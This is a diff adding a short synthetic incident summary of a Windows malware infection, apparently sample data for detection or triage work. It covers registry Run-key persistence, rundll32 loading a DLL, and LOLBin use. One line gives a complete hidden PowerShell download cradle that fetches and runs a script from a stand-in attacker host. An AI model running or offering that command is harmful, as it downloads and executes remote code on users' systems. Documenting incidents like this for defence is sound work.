@@ -1,0 +1,13 @@
+Incident summary (synthetic):
+
+- User reported slow system and suspicious pop-ups.
+- Autorun entry found under HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+  pointing to C:\Users\Public\updater.exe /silent (BadUpdater).
+- PowerShell process spawned from cmd.exe with a download cradle:
+  powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')
+- rundll32.exe later executed loader.dll from C:\Users\Public.
+- Evidence suggests:
+    * Initial execution via user action (possibly phishing attachment).
+    * Persistence using Run and RunOnce registry keys.
+    * Payload download from external C2 (malicious.example.com).
+    * Use of LOLBins (powershell.exe, rundll32.exe, wscript.exe).
